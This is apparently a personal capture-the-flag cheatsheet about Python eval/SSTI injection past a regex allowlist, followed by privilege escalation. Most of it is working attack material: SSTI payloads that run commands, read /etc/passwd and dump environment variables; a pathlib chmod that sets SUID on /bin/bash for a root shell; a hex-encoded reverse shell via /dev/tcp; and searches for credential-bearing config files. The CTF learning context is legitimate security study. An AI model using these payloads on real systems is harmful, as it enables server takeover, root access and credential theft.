# CTF Cheatsheet & Lessons Learned

---

## Lessons Learned

- **hashcat password cracking**
- **essential use of sqlmap for injection**
- **ssh -L \<port\>:127.0.0.1:\<port\> -l name@\<domain\>**
  - Allows you to access internal services running on a specific port to be accessible by browser
- **all passwords of a service may be found in .conf files**
- **always list internal services on privilege escalation**
  ```
  sudo ss -tulpn
  systemctl list-units --type=service --state=running
  ```
- **SSTI via Python eval() — user input inside eval(f"f'''...'''") executes as the server process owner**
- **pathlib.Path(path).chmod(mode) sets file permissions with zero commas — bypasses regex allowlists that block commas**
- **SUID bit (chmod 4755) on /bin/bash + running /bin/bash -p = instant root shell if set by root process**
- **when commas are blocked, look for OOP method chaining to split multi-arg calls into single-arg chains**
- **Flask running as root means any eval/exec injection is already root — no further escalation needed**
- **always map the exact allowed charset before trying payloads — saves time on regex-filtered inputs**
- **bytes.fromhex() encodes shell commands as hex to bypass space/special char restrictions in regex filters**
- **pathlib.write_bytes(bytes.fromhex('...')) can write arbitrary file content using only hex characters**

---

## Regex Testing Cheatsheet

### How to test a regex allowlist manually (Python)

```python
import re

pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")

tests = [
    ("test123",                          "basic alphanum"),
    ("hello world",                      "space - BLOCKED"),
    ("cmd,arg",                          "comma - BLOCKED"),
    ("$VAR",                             "dollar - BLOCKED"),
    ("a\\nb",                            "backslash - BLOCKED"),
    ("path/to/file",                     "slash - OK"),
    ("func()",                           "parens - OK"),
    ("{expr}",                           "curly braces - OK"),
    ("key=val",                          "equals - OK"),
    ("a+b",                              "plus - OK"),
    ("file.txt",                         "dot - OK"),
    ("snake_case",                       "underscore - OK"),
    ("'string'",                         "single quote - OK"),
    ("\"string\"",                       "double quote - OK"),
    ("__import__('os')",                 "import expression - OK"),
    ("0o4755",                           "octal literal - OK"),
    ("a;b",                              "semicolon - BLOCKED"),
    ("a|b",                              "pipe - BLOCKED"),
    ("a&b",                              "ampersand - BLOCKED"),
    ("a>b",                              "redirect - BLOCKED"),
    ("a<b",                              "redirect - BLOCKED"),
    ("a[0]",                             "square bracket - BLOCKED"),
    ("a-b",                              "dash - BLOCKED"),
    ("a*b",                              "asterisk - BLOCKED"),
    ("a!b",                              "exclamation - BLOCKED"),
    ("a@b",                              "at sign - BLOCKED"),
    ("a#b",                              "hash - BLOCKED"),
    ("a%b",                              "percent - BLOCKED"),
    ("a^b",                              "caret - BLOCKED"),
    ("a~b",                              "tilde - BLOCKED"),
    ("a`b",                              "backtick - BLOCKED"),
    ("a?b",                              "question mark - BLOCKED"),
]

print(f"{'INPUT':<40} {'LABEL':<30} {'RESULT'}")
print("-" * 85)
for val, label in tests:
    result = "PASS" if pattern.fullmatch(val) else "BLOCKED"
    print(f"{repr(val):<40} {label:<30} {result}")
```

---

### Common Regex Allowlist Patterns and What They Block

```
^[a-zA-Z0-9._'"(){}=+/]+$        (this challenge)
  ALLOWS:  letters, digits, . _ ' " ( ) { } = + /
  BLOCKS:  space , $ \ # ; | & > < [ ] - * ! @ % ^ ~ ` ?

^[a-zA-Z0-9\s]+$                  (basic alphanumeric + spaces)
  ALLOWS:  letters, digits, spaces
  BLOCKS:  everything else — very restrictive

^[a-zA-Z0-9._@-]+$               (common username/email field)
  ALLOWS:  letters, digits, . _ @ -
  BLOCKS:  spaces, quotes, parens, braces, operators

^[a-zA-Z0-9\s,._-]+$             (general text field)
  ALLOWS:  letters, digits, spaces, , . _ -
  BLOCKS:  quotes, parens, braces, operators, $, \

^[\w\s]+$                         (word chars + spaces, equivalent to [a-zA-Z0-9_\s])
  ALLOWS:  letters, digits, underscore, whitespace
  BLOCKS:  all punctuation and operators

^[^<>'"]+$                        (XSS basic filter — blocks angle brackets and quotes)
  ALLOWS:  almost everything except < > ' "
  BLOCKS:  HTML tags and quote-based injection — still vulnerable to many attacks
```

---

### Payload Building Rules for Regex-Filtered SSTI

```
COMMA BLOCKED     → use OOP method chaining
                    os.chmod(path, mode)        ← needs comma
                    Path(path).chmod(mode)      ← no comma ✅

SPACE BLOCKED     → stay in Python, never drop to shell
                    os.popen('chmod 755 /x')    ← space in string = blocked
                    Path('/x').chmod(0o755)     ← pure Python = no space ✅

BACKSLASH BLOCKED → use real newlines in multiline strings
                    write_text('line1\nline2')  ← backslash blocked
                    write_text('line1          ← real newline in source ✅
                    line2')

DOLLAR BLOCKED    → no $IFS, no $VAR, no ${} shell tricks
                    popen('cmd${IFS}arg')       ← $ blocked
                    Path(path).chmod(mode)      ← avoid shell entirely ✅

IMPORT BLOCKED    → use __import__() function form
                    import os                   ← statement, not usable in f-string
                    __import__('os')            ← function call, works in expression ✅

SPECIAL CHARS     → encode as hex, pass via bytes.fromhex()
BLOCKED           →  cmd = 'bash -i >& /dev/tcp/IP/PORT 0>&1'
                      hex = cmd.encode().hex()   # only 0-9a-f
                      payload = f"Path('/tmp/r.sh').write_bytes(bytes.fromhex('{hex}'))"
```

---

### Quick Charset Test One-Liner

```python
# Paste this to instantly test what chars a pattern allows
import re, string
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
allowed = [c for c in string.printable if pattern.fullmatch(c)]
blocked = [c for c in string.printable if not pattern.fullmatch(c) and c.strip()]
print("ALLOWED:", ''.join(allowed))
print("BLOCKED:", ''.join(blocked))
```

---

### Privilege Escalation Quick Reference

```bash
# List all listening services (find internal ports like Flask, MySQL, Redis)
sudo ss -tulpn
netstat -tulpn

# List running services
systemctl list-units --type=service --state=running

# Find SUID binaries already on the system
find / -perm -4000 -type f 2>/dev/null

# Check what the current user can sudo
sudo -l

# Find writable directories
find / -writable -type d 2>/dev/null

# Find config files that might have passwords
find / -name "*.conf" -readable 2>/dev/null
find / -name "*.env" -readable 2>/dev/null
find / -name "config.php" -readable 2>/dev/null

# Check crontabs
crontab -l
cat /etc/crontab
ls /etc/cron.*

# After setting SUID on bash
/bin/bash -p
whoami   # should be root

# Verify SUID was set
ls -la /bin/bash
# look for 's' in permissions: -rwsr-xr-x
```

---

### SSH Port Forwarding Quick Reference

```bash
# Forward remote internal port to your local machine
ssh -L <localport>:127.0.0.1:<remoteport> user@target

# Example: access Flask on port 54321 via your browser at localhost:8080
ssh -L 8080:127.0.0.1:54321 sedric@target.htb

# Then visit http://localhost:8080 in your browser

# Dynamic SOCKS proxy (proxy all traffic through target)
ssh -D 1080 user@target
```

---

### Python SSTI Payload Reference

```python
# Read a file
{open('/etc/passwd').read()}

# Run a command (single string arg, no spaces in path)
{__import__('os').popen('/usr/bin/id').read()}

# Set SUID on bash (the payload from this challenge)
{__import__('pathlib').Path('/bin/bash').chmod(0o4755)}

# Write file with no backslash (use real newlines)
{__import__('pathlib').Path('/tmp/x').write_text('content')}

# Write arbitrary bytes via hex (bypass space/special char restrictions)
{__import__('pathlib').Path('/tmp/r.sh').write_bytes(bytes.fromhex('HEX_HERE'))}

# Make file executable
{__import__('pathlib').Path('/tmp/r.sh').chmod(0o755)}

# Get environment variables
{__import__('os').environ}

# Read directory listing
{__import__('os').listdir('/')}
```

---

*cheatsheet — CTF research only*
